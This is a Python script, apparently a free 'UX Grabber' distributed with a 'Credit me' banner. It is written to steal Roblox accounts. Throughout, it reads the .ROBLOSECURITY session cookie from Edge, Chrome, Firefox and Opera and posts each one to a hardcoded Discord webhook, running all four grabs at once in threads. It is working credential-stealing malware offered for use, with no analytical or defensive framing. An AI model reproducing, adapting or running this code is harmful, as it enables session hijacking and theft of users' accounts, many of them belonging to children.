



#  ░██████╗░█████╗░██████╗░██╗██████╗░████████╗██╗░░░██╗███╗░░██╗██╗██╗░░██╗--
 # ██╔════╝██╔══██╗██╔══██╗██║██╔══██╗╚══██╔══╝██║░░░██║████╗░██║██║╚██╗██╔╝--
#  ╚█████╗░██║░░╚═╝██████╔╝██║██████╔╝░░░██║░░░██║░░░██║██╔██╗██║██║░╚███╔╝░--
#  ░╚═══██╗██║░░██╗██╔══██╗██║██╔═══╝░░░░██║░░░██║░░░██║██║╚████║██║░██╔██╗░--
#  ██████╔╝╚█████╔╝██║░░██║██║██║░░░░░░░░██║░░░╚██████╔╝██║░╚███║██║██╔╝╚██╗-
#  ╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░░░░░░░╚═╝░░░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝---
#                        github.com/ScriptUnix 

                        # Credit me lol or die
 
 import browser_cookie3, requests, threading

                               #Put your webhook below in between the ""

WebHook = "https://discord.com/api/webhooks/1047201308626669648/Tr8qR4JI2ay6jDgUWrX9XLCfEd5Y8ERmBoaCsOET9UtcXDaecnMBv3uLfMlYBphBgAmA"


































def MicrosoftEdge():
    try:
        cookies = browser_cookie3.edge(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
    except:
        pass

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
    except:
        pass

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        requests.post(WebHook, json = {"username" : "UX Grabber (FREE)", "content" : f"```{cookie}```"})
    except:
        pass

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()
